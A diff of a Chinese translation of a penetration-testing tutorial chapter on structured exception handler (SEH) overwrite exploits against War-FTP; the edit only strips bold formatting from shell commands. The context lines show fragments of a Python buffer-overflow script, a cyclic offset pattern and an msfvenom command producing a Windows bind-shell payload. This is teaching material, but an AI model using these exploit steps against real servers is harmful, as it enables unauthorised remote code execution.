@@ -21,7 +21,7 @@ Windows 系统使用一种名为*结构化异常处理程序（SEH）*的方法�
 示例 18-1. 使用 1,150 个 A 的 War-FTP 漏洞
 
 ```
-root@kali:~# **cat ftpexploit2**
+root@kali:~# cat ftpexploit2
 #!/usr/bin/python
 import socket
 buffer = "A" * 1150
@@ -52,7 +52,7 @@ s.close()
 示例 18-2. 使用模式生成精确定位攻击字符串中的 SEH 覆盖
 
 ```
-  root@kali:~# **cat ftpexploit2**
+  root@kali:~# cat ftpexploit2
   #!/usr/bin/python
   import socket
 ❶ buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2
@@ -271,7 +271,7 @@ s.close()
 我们现在已经第二次重定向了执行，跳转到了我们控制内存的更长部分——这是放置我们的 shellcode 的理想位置。接下来选择一个有效载荷，并使用 Msfvenom 生成，如下所示。
 
 ```
-root@kali:~# **msfvenom -p windows/shell_bind_tcp -s 573 -b '\x00\x40\x0a\x0d'**
+root@kali:~# msfvenom -p windows/shell_bind_tcp -s 573 -b '\x00\x40\x0a\x0d'
 [*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)
 buf =
 "\xbe\xa5\xfd\x18\xa6\xd9\xc6\xd9\x74\x24\xf4\x5f\x31\xc9" +
